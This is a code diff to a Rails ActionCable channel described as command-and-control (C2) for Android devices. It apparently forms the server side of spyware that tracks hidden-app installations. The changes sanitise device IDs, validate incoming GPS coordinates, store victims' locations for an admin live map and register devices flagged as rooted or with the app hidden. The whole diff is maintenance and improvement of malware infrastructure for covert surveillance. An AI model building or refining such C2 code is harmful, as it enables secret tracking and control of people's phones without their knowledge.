@@ -1,7 +1,7 @@
 # Command Channel for C2 communication with Android devices
 class CommandChannel < ApplicationCable::Channel
   def subscribed
-    @device_id = params[:device_id]
+    @device_id = sanitize_device_id(params[:device_id])
     stream_from "commands_#{@device_id}"
     
     # Mark device as online
@@ -70,7 +70,7 @@ class CommandChannel < ApplicationCable::Channel
 
   # Receive device info from Android
   def device_info(data)
-    smartphone = Smartphone.find_by(android_id: @device_id)
+    smartphone = Smartphone.find_by(device_id: @device_id)
     if smartphone
       smartphone.update(
         name: data['model'],
@@ -91,14 +91,25 @@ class CommandChannel < ApplicationCable::Channel
   def location_update(data)
     smartphone = find_or_create_smartphone
     
+    location = data['data'] || {}
+    latitude = location['latitude']
+    longitude = location['longitude']
+    timestamp = location['timestamp']
+    unless valid_coordinates?(latitude, longitude)
+      Rails.logger.warn "[CommandChannel] Invalid coordinates from #{@device_id}: #{latitude}, #{longitude}"
+      return
+    end
+    formatted_time = if timestamp.present?
+      Time.at(timestamp.to_i / 1000).strftime('%Y-%m-%d %H:%M:%S')
+    else
+      Time.current.strftime('%Y-%m-%d %H:%M:%S')
+    end
+
     GeoLocation.create!(
       smartphone: smartphone,
-      latitude: data.dig('data', 'latitude'),
-      longitude: data.dig('data', 'longitude'),
-      accuracy: data.dig('data', 'accuracy'),
-      altitude: data.dig('data', 'altitude'),
-      speed: data.dig('data', 'speed'),
-      captured_at: Time.at(data.dig('data', 'timestamp').to_i / 1000)
+      lat: latitude,
+      long: longitude,
+      date: formatted_time
     )
     
     # Broadcast to admin for live map
@@ -151,16 +162,34 @@ class CommandChannel < ApplicationCable::Channel
   end
 
   def find_or_create_smartphone
-    apk = ApkPayload.first
-    installation = ApkInstallation.find_or_create_by!(apk_payload: apk, target_ip: @device_id) do |i|
-      i.status = 'connected'
+    payload = ApkPayload.find_or_create_by!(name: 'default') do |apk|
+      apk.destination_ip = '0.0.0.0'
+      apk.destination_port = '8080'
     end
-    
-    Smartphone.find_or_create_by!(apk_installation: installation) do |s|
-      s.name = "Device #{@device_id[0..7]}"
-      s.operating_system = 'Android'
-      s.is_rooted = false
-      s.is_app_hidden = false
+
+    installation = ApkInstallation.find_or_create_by!(apk_payload: payload, target_ip: @device_id) do |record|
+      record.status = 'connected'
     end
+
+    smartphone = Smartphone.find_or_initialize_by(device_id: @device_id)
+    smartphone.apk_installation ||= installation
+    smartphone.name ||= "Device #{@device_id[0..7]}"
+    smartphone.operating_system ||= 'Android'
+    smartphone.is_rooted ||= 'Unknown'
+    smartphone.is_app_hidden ||= 'false'
+    smartphone.save!
+    smartphone
+  end
+
+  def sanitize_device_id(device_id)
+    device_id.to_s.gsub(/[^a-zA-Z0-9_.:\-]/, '')
+  end
+
+  def valid_coordinates?(lat, long)
+    lat_f = lat.to_f
+    long_f = long.to_f
+    lat.present? && long.present? && lat_f.between?(-90, 90) && long_f.between?(-180, 180)
+  rescue StandardError
+    false
   end
 end
